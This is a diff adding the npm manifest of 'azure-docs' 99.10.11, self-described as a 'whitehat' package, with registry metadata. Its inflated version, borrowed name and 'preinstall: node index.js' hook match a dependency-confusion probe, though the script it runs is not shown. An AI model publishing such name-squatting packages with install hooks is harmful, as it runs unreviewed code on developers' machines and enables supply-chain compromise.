@@ -1,0 +1,39 @@
+{
+    "name": "azure-docs",
+    "version": "99.10.11",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo 'error no test specified' && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "azure-docs@99.10.11",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-Z2OKk2aSj7pkS/R9Kiylqo3diRkJnIl+Nx7EfvPto8MZTwlcWHMFJml4jXRTUeyAMlSa4VNHBNwxEqxroVazCg==",
+        "shasum": "ccf5d42f8f81e4a0c9fb10b909a15ee27c790105",
+        "tarball": "https://registry.npmjs.org/azure-docs/-/azure-docs-99.10.11.tgz",
+        "fileCount": 2,
+        "unpackedSize": 5354,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiG20VACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmoEfBAAk0CuJxeVJDYxSyDsgyUjWQk7MXGfuI3Mb/luJxLFBDxzggDt\r\nfMAem7K363AVy0640Am8+DsE4UQACsWj6TUjzzcixwOWMrfbCcJVGc1DYrCk\r\nxmSfD7q1eSSO8tjFXrPJpsnJxRh2Ds2ZeCkugNKsusjR4DwCQvyWov5n8/Nx\r\nJyf6aGH5rmX2hpA8g/54ykJlODfPcO10o/v1+ZgPOFizW79PJ/UccIHYCVSt\r\nETbyMEIWt4GQ9LWRvEVSYvKGy/eQjPIKpZdn9EJG3CxH1YCfUJgKw+UYiHF5\r\ntKvvkdqWMMolK+t4HGZG6e1WWD1HHLbmZMr7ELIqI35ueUmAIWOCgIwruqRI\r\neShClACJiFiwlT3voweEpNehTf0oyrRVdiR1ds6kgm1mZKtGBfIGLOzDAtpB\r\nxJuuwjVb6/N7yOVEkFWOTBO/+lX0KpZgQExyhHVqCdyua7uLw2NohYh2TDLh\r\nDULQbjuMHRDIIBQcBCitlEyAieTRJvFd0o80AVKd+hTS8EO4rkPoQZ/UZexv\r\nBk0Mu/IYrpnt+qe7zlCT9/2kUrPDniZoRN34lJsNKuctym9eefIoIa7eCDGs\r\nOAtMO90/2p0Lb7RdhajaWHoaIOMmh0kEdu3cq17M26rM3qKEkoxZpHVCnLCu\r\nXfp3QjozgX99cZJt5Lq4RG8i71leAzSFuD4=\r\n=INCI\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "azuredocs",
+        "email": "azuredocs@rt11.33mail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "azuredocs",
+            "email": "azuredocs@rt11.33mail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/azure-docs_99.10.11_1645964565269_0.4235541030002332"
+    },
+    "_hasShrinkwrap": false
+}
